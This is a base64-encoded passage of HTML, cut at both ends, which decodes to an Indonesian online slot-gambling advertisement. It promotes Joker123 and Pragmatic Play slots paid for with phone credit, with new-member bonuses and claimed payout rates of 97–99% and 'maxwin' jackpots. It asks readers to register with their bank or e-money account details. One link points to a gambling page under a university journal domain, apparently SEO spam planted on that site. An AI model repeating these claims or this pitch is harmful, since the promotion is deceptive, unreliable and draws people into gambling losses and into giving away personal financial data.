BSTyBMdWNreSBHb2QgUHJvZ3Jlc3NpdmU8L2I+PC9wPgogICAgICAgICAgICAgICAgPHA+PHNwYW4gc3R5bGU9ImZvbnQtd2VpZ2h0OiA0MDA7Ij5JRCBQUk8gZGFyaSBKb2tlcjEyMyBzZWxhbHUgbWVuZ2hpYnVyIGtpdGEga2V0aWthIGtpdGEgYmVybWFpbiBqdWRpIHNsb3Qgb25saW5lLCBzZXBlcnRpIHBlcm1haW5hbiBqdWRpIG9ubGluZSB1YW5nIGFzbGkgcGFsaW5nIHBvcHVsZXIgSnVkaSBUZW1iYWsgSWthbi4gTmFtdW4sIHBlcm1haW5hbiBzbG90IHRhdXRhbiBpbmkgdGVya2VuYWwgZGVuZ2FuIGZha3RvciBrZWJlcnVudHVuZ2FuIHBlbWFpbm55YSB5YW5nIGJlc2FyIGRlbmdhbiBUTyBhdGF1IHBlbWJheWFyYW4ga2VjaWwuIE1ha2EgZGFyaSBpdHUgc2l0dXMganVkaSBzbG90IGJvbnVzIDEwMCAtIDIwMCBuZXcgbWVtYmVyIG1lcmVrb21lbmRhc2lrYW4gc2xvdCByZXNtaSBpbmkuIFNlbGFpbiBpdHUsIGp1ZGkgSUQgUFJPIG9ubGluZSBtZW1pbGlraSBSVFAgc2ViZXNhciA5Nyw4MCUuPC9zcGFuPjwvcD4KICAgICAgICAgICAgICAgIDxwPjxiPlNMT1QgSUQgUFJPIEdhdGVzIE9mIE9seW1wdXM8L2I+PC9wPgogICAgICAgICAgICAgICAgPHA+PHNwYW4gc3R5bGU9ImZvbnQtd2VpZ2h0OiA0MDA7Ij5UZXJha2hpciwgZGkgc2l0dXMgc2xvdCBvbmxpbmUsIGJvY29yYW4gUFJPIElEIHBhbGluZyByZXNtaSBkYXRhbmcgZGFyaSBwcm92aWRlciBQcmFnbWF0aWMgUGxheSBiZXJuYW1hIEdhdGVzIG9mIE9seW1wdXMuIEdpbSBpbmkgbWVuZ2FtYmlsIHRlbWEgZGV3YSBiZXJuYW1hIFpldXMuIElEIFBSTyBvbmxpbmUgaW5pIGhhcnVzIGRpc2VydGFrYW4gZGFsYW0gaW5mb3JtYXNpIHlhbmcgYm9jb3IuIElEIFBSTyBoYXJpIGluaSBtdWRhaCBkaW1lbmFuZ2thbiBrYXJlbmEgdGluZ2thdCBrZW1lbmFuZ2FuIFJUUCBoYW1waXIgOTklLjwvc3Bhbj48L3A+CgoKCgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Rpdj4KCiAgICAgICAgPGRpdiBjbGFzcz0icm93Ij4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLXNtLTEyIj4KICAgICAgICAgICAgICAgIDwhLS0gUEFSQUdSQVBIIDIgVEVNUExBVEUKCiAgICAgICAgICAgICAgICA8aDMgY2xhc3M9InRpdGxlIiBhbGlnbj0iY2VudGVyIj48L2gzPgogICAgICAgICAgICAgICAgPHAgaXRlbXByb3A9InRleHQiPgoKICAgICAgICAgICAgICAgIDwvcD4KCiAgICAgICAgICAgICAgICAgLS0+CgogICAgICAgICAgICAgICAgPGgyIGNsYXNzPSJ0aXRsZSIgYWxpZ249ImNlbnRlciI+MTAgRGFmdGFyIEdhbWUgU2xvdCBEZXBvc2l0IFBha2FpIFB1bHNhIDUwMDAgR2Fjb3IgTWF4d2luPC9oMj4KICAgICAgICAgICAgICAgIDxwPkRhZnRhciBzbG90IGluZG9zYXQgZGVwb3NpdCBwdWxzYSA1MDAwIHRhbnBhIHBvdG9uZ2FuIGRpIHNpdHVzIGp1ZGkgPGEgaHJlZj0iaHR0cHM6Ly9qdXJuYWxmc2gudWluc2J5LmFjLmlkL3B1YmxpYy8tL2lkLXByby1zbG90LyI+PHN0cm9uZz5TbG90IEdhY29yPC9zdHJvbmc+PC9hPiB0ZXJha2hpciBwYXN0aSBzYW5nYXQgbXVkYWggZGFuIHNhbmdhdCBzaW5na2F0IHVudHVrIGRpdGFuZ2FuaS4gSW5pbGFoIHNhbGFoIHNhdHUgYWxhc2FuIG1lbmdhcGEgd2Vic2l0ZSBrYW1pIGRpa2VuYWwgc2ViYWdhaSBzaXR1cyBzbG90IGRlcG9zaXQgcHVsc2EgdGVyYmFpayBiZWtlcmphc2FtYSBkZW5nYW4gYmViZXJhcGEgcHJvdmlkZXIgZ2FtZSBzbG90IG9ubGluZSB0ZXJiZXNhciBkYW4gdGVycGVyY2F5YSBkaSBkdW5pYSwgc2VwZXJ0aSA6PC9wPgogICAgICAgICAgICAgICAgPG9sPgogICAgICAgICAgICAgICAgICAgIDxsaT4KICAgICAgICAgICAgICAgICAgICAgICAgPHA+U2xvdCBQdWxzYSBEZXBvc2l0IFB1bHNhIFByYWdtYXRpYyBQbGF5PC9wPgogICAgICAgICAgICAgICAgICAgIDwvbGk+CiAgICAgICAgICAgICAgICAgICAgPGxpPgogICAgICAgICAgICAgICAgICAgICAgICA8cD5TbG90IFB1bHNhIERlcG9zaXQgUHVsc2EgSGFiYW5lcm88L3A+CiAgICAgICAgICAgICAgICAgICAgPC9saT4KICAgICAgICAgICAgICAgICAgICA8bGk+CiAgICAgICAgICAgICAgICAgICAgICAgIDxwPlNsb3QgUHVsc2EgRGVwb3NpdCBQdWxzYSBQRyBTb2Z0PC9wPgogICAgICAgICAgICAgICAgICAgIDwvbGk+CiAgICAgICAgICAgICAgICAgICAgPGxpPgogICAgICAgICAgICAgICAgICAgICAgICA8cD5TbG90IFB1bHNhIERlcG9zaXQgUHVsc2EgSm9rZXIxMjM8L3A+CiAgICAgICAgICAgICAgICAgICAgPC9saT4KICAgICAgICAgICAgICAgICAgICA8bGk+CiAgICAgICAgICAgICAgICAgICAgICAgIDxwPlNsb3QgUHVsc2EgRGVwb3NpdCBQdWxzYSBTcGFkZWdhbWluZzwvcD4KICAgICAgICAgICAgICAgICAgICA8L2xpPgogICAgICAgICAgICAgICAgICAgIDxsaT4KICAgICAgICAgICAgICAgICAgICAgICAgPHA+U2xvdCBQdWxzYSBEZXBvc2l0IFB1bHNhIE1pY3JvZ2FtaW5nPC9wPgogICAgICAgICAgICAgICAgICAgIDwvbGk+CiAgICAgICAgICAgICAgICAgICAgPGxpPgogICAgICAgICAgICAgICAgICAgICAgICA8cD5TbG90IFB1bHNhIERlcG9zaXQgUHVsc2EgQ1E5PC9wPgogICAgICAgICAgICAgICAgICAgIDwvbGk+CiAgICAgICAgICAgICAgICAgICAgPGxpPgogICAgICAgICAgICAgICAgICAgICAgICA8cD5TbG90IFB1bHNhIERlcG9zaXQgUHVsc2EgUGxheXRlY2g8L3A+CiAgICAgICAgICAgICAgICAgICAgPC9saT4KICAgICAgICAgICAgICAgICAgICA8bGk+CiAgICAgICAgICAgICAgICAgICAgICAgIDxwPlNsb3QgUHVsc2EgRGVwb3NpdCBQdWxzYSBMaXZlMjI8L3A+CiAgICAgICAgICAgICAgICAgICAgPC9saT4KICAgICAgICAgICAgICAgICAgICA8bGk+CiAgICAgICAgICAgICAgICAgICAgICAgIDxwPlNsb3QgUHVsc2EgRGVwb3NpdCBQdWxzYSBTbG90ODg8L3A+CiAgICAgICAgICAgICAgICAgICAgPC9saT4KICAgICAgICAgICAgICAgIDwvb2w+CiAgICAgICAgICAgICAgICA8cD5IYWwgaW5pbGFoIHlhbmcgbWVtcGVuZ2FydWhpIGthbWkgc2ViYWdhaSBhZ2VuIGp1ZGkgc2xvdCBkZXBvc2l0IHB1bHNhIHRhbnBhIHBvdG9uZ2FuLiBLYW1pIGJlcmhhcmFwIGRhcGF0IHRlcnVzIG1lbmR1a3VuZyBhbmRhIHlhbmcgaW5naW4gbWVuY29iYSBwZXJ1bnR1bmdhbiBiZXJ0YXJ1aCBzbG90IGRlcG9zaXQgcHVsc2EgZ2Fjb3IgdmlhIHRlbGtvbXNlbCwgaW5kb3NhdCBhdGF1IHhsLiBEZXBvc2l0IHlhbmcga2FtaSBiZXJpa2FuIHNhbmdhdCB0ZXJqYW5na2F1IG11bGFpIGRhcmkgUnAgMTAuMDAwLiBBbmRhIHN1ZGFoIGJpc2EgbWVuY29iYSBwZXJtYWluYW4gc2xvdCBkZXBvc2l0IHB1bHNhIGluZG9zYXQgdGFucGEgcG90b25nYW4sIGxpdmUgY2FzaW5vLCBqdWRpIHNwb3J0c2Jvb2ssIHRvZ2VsLCBzYWJ1bmcgYXlhbSBkYW4gcGVybWFpbmFuIG1lbmd1bnR1bmdrYW4gbGFpbm55YS4gS3VuanVuZ2kgc2VrYXJhbmcganVnYSBzaXR1cyBzbG90IGRlcG9zaXQgcHVsc2EgdGFucGEgcG90b25nIGdhY29yIG1lbGFsdWkgc2VkZXJldCBzaXR1cyBqdWRpIFNsb3QgUHVsc2EgdGVycGVyY2F5YSBkYWZ0YXIganVkaSBTbG90IFB1bHNhIG1heHdpbiBwYWxpbmcgbXVkYWgga2h1c3VzbnlhIHBlbXVsYSBqdWdhIGJpc2EgbWVuZ2V0YWh1aSBjYXJhIGRhZnRhciBqdWRpIHNsb3QgZGVwb3NpdCA1MDAwIHB1bHNhIHRlcmJhaWsgZGkgaW5kb25lc2lhLiAuPC9wPgogICAgICAgICAgICAgICAgPHA+U2ViYWdhaSBwZW1haW4gdGVudHVueWEgaW5naW4gbWVuZ2V0YWh1aSBsZWJpaCBkYWxhbSBhcGEgc2FqYSBzeWFyYXQgZGFmdGFyIGp1ZGkgc2xvdCBwdWxzYSBpbmRvc2F0IDUwMDAgdGVycGVyY2F5YSB0YW5wYSBwb3RvbmdhbiBkaSBJbmRvbmVzaWEuIFNlcGVydGkgeWFuZyBraXRhIGtldGFodWksIHBlcm1haW5hbiB5YW5nIHNhdHUgaW5pIG1lbnllZGlha2FuIGZpdHVyIGRhZnRhciBzbG90IG9ubGluZSB1YW5nIGFzbGkgeWFuZyBwYWxpbmcgbXVkYWggZGFuIG11ZGFoIGRpcGFoYW1pIHVudHVrIHBhcmEgcGVtdWxhLjwvcD4KICAgICAgICAgICAgICAgIDxoMj5XZWJzaXRlIERhZnRhciBTbG90IERlcG8gUHVsc2EgVGFucGEgUG90b25nYW4gVGVycG9wdWxlcjwvaDI+CiAgICAgICAgICAgICAgICA8cD5EYWZ0YXIgc2xvdCBkZXBvc2l0IHB1bHNhIHRhbnBhIHBvdG9uZ2FuIHNlYmFnYWkgcHJvdmlkZXIganVkaSBzbG90IGRlcG9zaXQgcHVsc2Egb25saW5lIHBhbGluZyB2aXJhbCBtZW1pbGlraSBiZXJiYWdhaSBtYWNhbSBwcm92aWRlciBzbG90IHB1bHNhIHlhbmcgdGVya2VuYWwgZGkga2FsYW5nYW4gcGVjaW50YSBzbG90IHB1bHNhLiBIYWwgcGVydGFtYSB5YW5nIHBlcmx1IEFuZGEgbGFrdWthbiB1bnR1ayBtZW5pa21hdGkgcGVybWFpbmFuIHNsb3QgZGVwb3NpdCBwdWxzYSBvbmxpbmUgYWRhbGFoIG1lbGFrdWthbiB0cmFuc2Frc2kgc2xvdCBkZXBvc2l0IHB1bHNhLiBTZXRlbGFoIGl0dSBhbmRhIGJpc2EgbWVtaWxpaCBqZW5pcyBwZXJtYWluYW4gc2xvdCBkZXBvc2l0IHB1bHNhIGdhY29yIHlhbmcgYW5kYSBzdWthaSB1bnR1ayBiZXJtYWluIHNsb3QgZGVwb3NpdCBwdWxzYSBpbmRvc2F0IHRhbnBhIHBvdG9uZ2FuLiBBbmRhIGRhcGF0IG1lbWFpbmthbiBwZXJtYWluYW4gc2xvdCBkZXBvc2l0IHB1bHNhIHRhbnBhIHBvdG9uZ2FuIG1lbGFsdWkga29tcHV0ZXIgYXRhdSBsZWJpaCBwcmFrdGlzbnlhIG1lbGFsdWkgcG9uc2VsL3BlcmFuZ2thdCBBbmRhLiBBbmRhIGp1Z2EgYmlzYSBkb3dubG9hZCBhcGxpa2FzaSBzaXR1cyBzbG90IGRlcG9zaXQsIHNsb3QgZGVwb3NpdCBwdWxzYSBvbmxpbmUsIGRvd25sb2FkIGRpIGhhbmRwaG9uZS9nYWRnZXQgYW5kYS4gQmVyaWt1dCBwYW5kdWFuIGRhZnRhciBzbG90IHB1bHNhIGJlcmRhc2Fya2FuIFNpdHVzIERhZnRhciBTbG90IFB1bHNhIFVuY3V0IFBhbGluZyBWaXJhbCAyMDIzLjwvcD4KICAgICAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAgICAgICA8bGk+CiAgICAgICAgICAgICAgICAgICAgICAgIDxwPk1hc3Vra2FuIG5hbWEgdXNlciBJRCBiZXNlcnRhIHBhc3N3b3JkIHlhbmcgYW5kYSBtYXU8L3A+CiAgICAgICAgICAgICAgICAgICAgPC9saT4KICAgICAgICAgICAgICAgICAgICA8bGk+CiAgICAgICAgICAgICAgICAgICAgICAgIDxwPk1hc3Vra2FuIGVtYWlsIGRhbiBub21vciB0ZWxlcG9uIGFuZGE8L3A+CiAgICAgICAgICAgICAgICAgICAgPC9saT4KICAgICAgICAgICAgICAgICAgICA8bGk+CiAgICAgICAgICAgICAgICAgICAgICAgIDxwPk1hc3Vra2FuIGRhdGEgcHJpYmFkaSBhbmRhIGJlcnVwYSBuYW1hIGxlbmdrYXAgZGFuIG5vbW9yIHJla2VuaW5nIGJhbmsgLyBlLW1vbmV5PC9wPgogICAgICAgICAgICAgICAgICAgIDwvbGk+CiAgICAgICAgICAgICAgICAgICAgPGxpPgogICAgICAgICAgICAgICAgICAgICAgICA8cD5MYWx1IGFuZGEgaGFueWEgcGVybHUgbWVuZWthbiB0b21ib2wgZGFmdGFyIGRpIGJhZ2lhbiBiYXdhaCBoYWxhbWFuIHBlbmRhZnRhcmFuPC9wPgogICAgICAgICAgICAgICAgICAgIDwvbGk+CiAgICAgICAgICAgICAgICA8L3VsPgogICAgICAgICAgICAgICAgPHA+U2V0ZWxhaCBiZXJoYXNpbCBtZW5kYWZ0YXIgc2ViYWdhaSBtZW1iZXIgc2xvdCBkZXBvc2l0IHB1bHNhIDUwMDAgdGFucGEgcG90b25nYW4sIGFuZGEgZGFwYXQgbWVuZ2h1YnVuZ2kgY3VzdG9tZXIgc2VydmljZSBrYW1pIHVudHVrIG1lbWludGEgbm9tb3IgdGVsZXBvbiB1bnR1ayBtZWxha3VrYW4gZGVwb3NpdCBzbG90IG1lbmdndW5ha2FuIHB1bHNhIHRlbGtvbXNlbCwgaW5kb3NhdCBhdGF1IHhsLiBQZXJsdSBhbmRhIGtldGFodWksIHNldGVsYWggYW5kYSBtZWxha3VrYW4gZGVwb3NpdCBzbG90IG9ubGluZSB2aWEgcHVsc2EsIGFuZGEgZGloYXJ1c2thbiB1bnR1ayBtZW1pbGloIHByb21vIGJvbnVzIHNsb3QgZGVwb3NpdCBwdWxzYSBkaSBoYWxhbWFuIGRlcG9zaXQuIE5hbXVuLCBqaWthIEFuZGEgdGlkYWsgaW5naW4gbWVuZ2FtYmlsIHByb21vc2kgYXBhIHB1biwgQW5kYSBoYW55YSBwZXJsdSBtZW1haW5rYW4gc2VtdWEgcGVybWFpbmFuIGp1ZGkgb25saW5lIGRpIHNpdHVzIHdlYiBrYW1pIHNlY2FyYSBncmF0aXMgdGFucGEgcG90b25nYW4uPC9wPgogICAgICAgICAgICAgICAgPHA+QmFueWFrIG1lbWJlciBiYXJ1IHlhbmcgbWVuZGFmdGFyIGRpIHNpdHVzIHNsb3QgZGVwb3NpdCBwdWxzYSAxMHJiIHRhbnBhIHBvdG9uZ2FuIGxhbmdzdW5nIG1lbmdhbWJpbCBib251cyBzbG90IGRlcG9zaXQgcHVsc2EgdGFucGEgcG90b25nYW4sIGthcmVuYSBkZW5nYW4gYm9udXMgc2xvdCBkZXBvc2l0IHB1bHNhIG9ubGluZSBhbmRhIG1lbWlsaWtpIHNhbGRvIGxlYmloLiBIYWwgaW5pIG1lbWJ1YXQgYW5kYSBsZWJpaCBiZXJwZWx1YW5nIHVudHVrIG1lbWVuYW5na2FuIHBlcm1haW5hbiBTbG90IFB1bHNhIG1heHdpbiBkaSBzbG90IGRlcG9zaXQgcHVsc2EgdGlkYWsgZGl0b2xhayAyMDIzLjwvcD4KICAgICAgICAgICAgICAgIDxoMj5LZXVudHVuZ2FuIEppa2EgQmVybWFpbiBEaSBTaXR1IFNsb3QgUHVsc2EgVGVyYmFpayAyMDIzPC9oMj4KICAgICAgICAgICAgICAgIDxwPktldW50dW5nYW4gTWVtYmVyIEJhcnUgQmVybWFpbiBkaSBTbG90IEp1ZGkgRGVwb3NpdCBQdWxzYSBJbmRvc2F0IFRlcmJhaWsgMjAyMyBzZXJ0YSBhZ2VuIHNsb3QgdGVyYmFydSwgbXVkYWggbWVuYW5nLCBqdWdhIG1lbWlsaWtpIHByb21vIGJvbnVzIGdyb3VwIG1lbWJlciBiYXJ1LCBqYWNrcG90IG11ZGFoIGRpbWFqdWthbiwgdGlkYWsgcGVybHUgdHVybm92ZXIuIEJvbnVzIHNsb3QgbWVtYmVyIGJhcnUgdGFucGEgVE8gbWVydXBha2FuIGJvbnVzIHlhbmcgdGlkYWsgZGlrZW5ha2FuIGJpYXlhIGFwYXB1bi4gRGFuIGhhbnlhIG1lbGFsdWkgYWdlbiBzbG90IHB1bHNhIGluZG9zYXQga2h1c3VzIGJvbnVzIG1lbWJlciBiYXJ1IDEwMCBkaSBzbG90IGJvbnVzIG1lbWJlciBiYXJ1LCBqYWRpIGFuZGEgYmlzYSBtZW5kYXBhdGthbiBwcm9tbyBzbG90IG1lbWJlciBiYXJ1LjwvcD4KICAgICAgICAgICAgICAgIDxwPkJvbnVzIHNsb3QgZGVwb3NpdCBwdWxzYSAxMDAlIHVudHVrIHNlbXVhIG1lbWJlciBiYXJ1IDIwMjMga2luaSBtdWxhaSBwb3B1bGVyIGRpIGthbGFuZ2FuIHBlY2ludGEgZ2FtZSBzbG90LCB0ZXJ1dGFtYSB5YW5nIG1lbmdndW5ha2FuIG1lc2luIHBlbmNhcmkgR29vZ2xlLiBJbmkga2FyZW5hIFNsb3QgRGVwb3NpdCBQdWxzYSBJbmRvc2F0IDEwMCBtZW1iZXIgYmFydSBhd2FsbnlhIHNhbmdhdCBtZW1iYW50dSBzZW11YSBtZW1iZXIgeWFuZyBiZXJtYWluIFNsb3QgRGVwb3NpdCBQdWxzYSBJbmRvc2F0IHRhbnBhIHBvdG9uZ2FuLiBCZXJpa3V0IGtldW50dW5nYW4gbWVtYmVyIGJhcnUgYmVybWFpbiBkaSBMaW5rIEp1ZGkgU2xvdCBEZXBvc2l0IFB1bHNhIEluZG9zYXQgdGFucGEgbWVuZ2d1bmFrYW4gcGVuZ2hhc2lsYW4gc2FtYSBzZWthbGkuPC9wPgogICAgICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAgICAgICAgIDxsaT4KICAgICAgICAgICAgICAgICAgICAgICAgPHA+Qm9udXMgUHVsc2EgU2xvdCAxMDAlIERpIE11a2E8L3A+CiAgICAgICAgICAgICAgICAgICAgPC9saT4KICAgICAgICAgICAgICAgIDwvdWw+CiAgICAgICAgICAgICAgICA8cD5Cb251cyBwdWxzYSBTbG90IFB1bHNhIDEwMCUgYWRhbGFoIGJvbnVzIHlhbmcgZGliZXJpa2FuIDF4IGxpcGF0IGRhcmkgZGVwb3NpdCBzbG90IHRhbnBhIGFkYSBwb3RvbmdhbiBhcGFwdW4geWFuZyBhbmRhIGxha3VrYW4uIE1pbmltYWwgbW9kYWwgdW50dWsgYm9udXMgaW5pIGFkYWxhaCA1MHJiLCBqYWRpIG1ha3NpbWFsIGJvbnVzIHlhbmcgYmlzYSBkaWRhcGF0a2FuIGFkYWxhaCA1MHJiLiBCb251cyBpbmkgZGliZXJpa2FuIHRlcmxlYmloIGRhaHVsdSBzYWF0IEFuZGEgc3VkYWggbWVuZ2tsYWltIGJvbnVzIGluaSBzYWF0IG1lbGFrdWthbiB0cmFuc2ZlciBwdWxzYS48L3A+CiAgICAgICAgICAgICAgICA8dWw+CiAgICAgICAgICAgICAgICAgICAgPGxpPgogICAgICAgICAgICAgICAgICAgICAgICA8cD5Cb251cyBNZW1iZXIgQmFydSAxMDAlPC9wPgogICAgICAgICAgICAgICAgICAgIDwvbGk+CiAgICAgICAgICAgICAgICA8L3VsPgogICAgICAgICAgICAgICAgPHA+Qm9udXMgaW5pIGRpYmVyaWthbiBrZXBhZGEgbWVtYmVyIGJhcnUgZGFuIGhhbnlhIHlhbmcgYmVybWFpbiBnYW1lIHNsb3QgcHVsc2EuIEJvbnVzIGluaSBkaWJlcmlrYW4gZGVuZ2FuIGtlbGlwYXRhbiAxeCBtb2RhbCBhd2FsIEFuZGEuIE1ha3NpbXVtIGJvbnVzIHlhbmcgZGliZXJpa2FuIGFkYWxhaCA1MDAgcmlidS4gSmFkaSBiZXJhcGFwdW4gYmVzYXJueWEgbW9kYWwgYW5kYSwgbWFrc2ltYWwgeWFuZyBkaWJlcmlrYW4gdGV0YXAgNTAwcmIuPC9wPgogICAgICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAgICAgICAgIDxsaT4KICAgICAgICAgICAgICAgICAgICAgICAgPHA+Qm9udXMgTmV3IE1lbWJlciAxMDAlIFBlcm1haW5hbiBTbG90IFB1bHNhIEhpbmdnYSBLZWNpbDwvcD4KICAgICAgICAgICAgICAgICAgICA8L2xpPgogICAgICAgICAgICAgICAgPC91bD4KICAgICAgICAgICAgICAgIDxwPkJvbnVzIGluaSBzYW1hIGRlbmdhbiBib251cyBkaSBhdGFzIHlhaXR1IHtib251cyAxMDAlIG5ldyBtZW1iZXIgKHNsb3QgZ2FtZSl9IEN1bWEgYm9udXMgc2xvdCBwdWxzYSBkZXBvc2l0IGdhY29yIHlhbmcgZGliZXJpa2FuIEdhbWUgU2xvdCBEYW5hIG1lbWlsaWtpIFRPIHlhbmcgcmVsYXRpZiBrZWNpbC4gQm9udXMgaW5pIHNlcmluZyBkaWFuZ2dhcCBzZWJhZ2FpIGJvbnVzIHNhbGRvIHRhbnBhIGRlcG9zaXQgaG9raSBkaSBJbmRvbmVzaWEuPC9wPgogICAgICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAgICAgICAgIDxsaT4KICAgICAgICAgICAgICAgICAgICAgICAgPHA+MTAwJSBTbG90IFB1bHNhIFBlcmp1ZGlhbiBCb251cyBCZXNhciB1bnR1ayBOZXcgTWVtYmVyPC9wPgogICAgICAgICAgICAgICAgICAgIDwvbGk+CiAgICAgICAgICAgICAgICA8L3VsPgogICAgICAgICAgICAgICAgPHA+SW5pIGFkYWxhaCBzbG90IGtyZWRpdCBib251cyBhbmdnb3RhIGJhcnUgZGkgbXVrYSBkZW5nYW4gVE8geWFuZyBiZXNhci4gQm9udXMgaW5pIGp1Z2EgbWVtaWxpa2kgYm9udXMgbWFrc2ltYWwgMTAwJSB5YW5nIHNhbmdhdCBiZXNhciBkZW5nYW4gYm9udXMgbWFrc2ltYWwgNTAwcmIuIFRlbnR1IHNhamEsIHNlbWFraW4gYmVzYXIganVtbGFoIGJvbnVzIHlhbmcgQW5kYSBkYXBhdGthbiwgc2VtYWtpbiBiZXNhciBwdWxhIFRPIHlhbmcgYWthbiBkaWJlcmlrYW4uIFRPIGJlc2FyIGluaSBkaWtlbmFsIGRlbmdhbiBCb251cyBTbG90IG1lbWJlciBiYXJ1IDEwMCUgSElOR0dBIDE1eC48L3A+CiAgICAgICAgICAgICAgICA8aDM+U2xvdCBQdWxzYSBXaW5yYXRlIFRlcnRpbmdnaSBHYW1wYW5nIE1lbmFuZyBKYWNrcG90IE1heHdpbjwvaDM+CiAgICAgICAgICAgICAgICA8cD5TYWxhbSBwZWNpbnRhIGp1ZGkgc2xvdCBkZXBvc2l0IHB1bHNhIDEwLjAwMCBzZWx1cnVoIGluZG9uZXNpYSBraHVzdXNueWEgYW5kYSB5YW5nIHNlZGFuZyBtZW5jYXJpIGFnZW4gc2xvdCBkZXBvc2l0IHB1bHNhIHRhbnBhIHBvdG9uZ2FuIHlhbmcgbWVueWVkaWFrYW4gTGl2ZSBSVFAgR2Fjb3IgU2xvdCB1bnR1ayBhbmRhIG1ha2EgYW5kYSBiZXJhZGEgZGkgYXJ0aWtlbCB5YW5nIHRlcGF0IGRpc2luaS4gS2FyZW5hIGthbWkgaGFkaXIgbWVtYmVyaWthbiBzbG90IHByYWdtYXRpcyBkZXBvc2l0IHB1bHNhIGdhY29yIHRhbnBhIHBvdG9uZ2FuIHRlcmJhcnUgTGl2ZSBSVFAgc2xvdCB5YW5nIGJpc2EgYW5kYSBwaWxpaCBkYW4gamFkaWthbiBhY3VhbiBzZWJhZ2FpIHBpbGloYW4gc2FhdCBhbmRhIGJlcm1haW4ganVkaSBTbG90IFB1bHNhIG1heHdpbiBtdWRhaCBtZW5hbmcgamFja3BvdCB0ZXJiZXNhciBkZW5nYW4geWFuZyB0ZXJiYWlrIGRhbiB0ZXJiYWlrLiB5YW5nIHBhbGluZy4gc2xvdCBvbmxpbmUgdGVycGVyY2F5YS48L3A+CiAgICAgICAgICAgICAgICA8cD5UZW50dW55YSBkZW5nYW4gdGluZ2thdCBrZWFtYW5hbiB0ZXJiYWlrIHBhcmEgcGVuanVkaSBzbG90IG9ubGluZSBiaXNhIGJlcm1haW4gZGVuZ2FuIGFtYW4sIG55YW1hbiBkYW4gbWVuYW5nIG1heHdpbiBuYW50aW55YS4gS2FyZW5hIHRpZGFrIHBlcmx1IGtoYXdhdGlyIGRhdGEgcHJpYmFkaSB0aWRhayBha2FuIGphdHVoIGtlIHBpaGFrIGxhaW4uIFNlbGFpbiBpdHUgYWdlbiBkYWZ0YXIgc2xvdCBkZXBvc2l0IHB1bHNhIDEwLjAwMCB0YW5wYSBwb3RvbmdhbiBrYW1pIGp1Z2EgbWVtaWxpa2kgY3VzdG9tZXIgc2VydmljZSBwcm9mZXNzaW9uYWwgeWFuZyBzZWxhbHUgc2lhcCBtZWxheWFuaSBhbmRhIDI0IGphbSBub25zdG9wIGRhcmkgcGFnaSwgc2lhbmcsIHNvcmUgaGluZ2dhIG1hbGFtLiBIYWwgaW5pIHRlbnR1bnlhIGFrYW4gbWVtYnVhdCBhbmRhIGxlYmloIG55YW1hbiBzYWF0IGJlcm1haW4gc2xvdCBSVFAgbGl2ZSBib2NvcmFuIHNsb3QgZGVwb3NpdCBwdWxzYSBoYXJpIGluaSB0aWRhayBhZGEgcG90b25nYW4uPC9wPgogICAgICAgICAgICAgICAgPHA+RGFuIHBhZGEga2VzZW1wYXRhbiBrYWxpIGluaSBrYW1pIHRlbGFoIG1lbnlpYXBrYW4gYmViZXJhcGEgQm9jb3JhbiBTbG90IERlcG9zaXQgUHVsc2EgUlRQIExhbmdzdW5nIDEwMDAwIE5vIEN1dCBIYXJpIEluaSBwYXN0aW55YSBraHVzdXMgdW50dWsgYW5kYSB5YW5nIGluZ2luIGJlcm1haW4gbWFsYW0gaW5pLiBOYW11biBzZWJlbHVtbnlhIHBhc3Rpa2FuIGFuZGEgc3VkYWggYmVyZ2FidW5nIGRpIGFnZW4gc2xvdCBkZXBvc2l0IG5hZGkgZ2Fjb3IgdGVyYmFydSAyMDIzIHVudHVrIHRhaHVuIDIwMjMgc2VrYXJhbmcgYmVyc2FtYSBrYW1pIHVudHVrIG1lbmRhcGF0a2FuIGtldW50dW5nYW4geWFuZyBtYWtzaW1hbCBuYW50aW55YS4gQmVyaWt1dCBEYWZ0YXIgQm9jb3JhbiAxMC4wMDAgTGl2ZSBSVFAgQ3JlZGl0IERlcG9zaXQgU2xvdHMgTm8gQ3V0cyBUb2RheSwgU3VyZSBUbyBCZSwgVGVyc2VkaWEgRWtza2x1c2lmIFVudHVrIEFuZGEuPC9wPgogICAgICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAgICAgICAgIDxsaT4KICAgICAgICAgICAgICAgICAgICAgICAgPHA+U2xvdCBQdWxzYSBXaW5yYXRlIFRlcnRpbmdnaSBHcmVhdCBSaGlubyBNZWdhd2F5czwvcD4KICAgICAgICAgICAgICAgICAgICA8L2xpPgogICAgICAgICAgICAgICAgPC91bD4KICAgICAgICAgICAgICAgIDxwPkluaSBCb2NvcmFuIFJUUCBTbG90IFB1bHNhIFRlcmJhcnUsIFNsb3QgR2FtZSBHYWNvciBEZXBvc2l0IFB1bHNhIFRlcmJhcnUgTm8gQ3V0IE1lbmFuZyBNYXh3aW4gSmFja3BvdCBUZXJiZXNhciBkYXJpIEhpdCBQcmFnbWF0aWMgUGxheSBUaGUgR3JlYXQgUmhpbm8gTWVnYXdheXMuIFJlZmVyZW5zaSBHYWNvciBTbG90IE9ubGluZSBEZXBvc2l0IFB1bHNhIDEwLjAwMCBkZW5nYW4gdGVtYSBBbmltYWwgYXRhdSBTYWZhcmkgc2VsYWx1IGJpc2EgbWVuZ2hpYnVyLCBzZWxhaW4gaXR1IG5pbGFpIFJUUCBTbG90IFB1bHNhIHRlcmJlc2FyIHNhbmdhdCB0aW5nZ2kgeWFpdHUgOTcsODQlLjwvcD4KICAgICAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAgICAgICA8bGk+CiAgICAgICAgICAgICAgICAgICAgICAgIDxwPlNsb3QgUHVsc2EgV2lucmF0ZSBUZXJ0aW5nZ2kgSG90IEhvdCBGcnVpdDwvcD4KICAgICAgICAgICAgICAgICAgICA8L2xpPgogICAgICAgICAgICAgICAgPC91bD4KICAgICAgICAgICAgICAgIDxwPkJvY29yYW4gdGVyYmFydSBzbG90IGRlcG9zaXQgcHVsc2EgR2Fjb3IgSG90IEZydWl0IGJpc2EgQW5kYSB0ZW11a2FuIGRpIGRhZnRhciBwZW55ZWRpYSBzbG90IGRlcG9zaXQgcHVsc2EgdGFucGEgcG90b25nYW4gSGFiYW5lcm8uIFRhbXBpbGFuIHBlcm1haW5hbiBhZ2VuIHNsb3QgaW5pIGJlcnRlbWFrYW4gYnVhaC1idWFoYW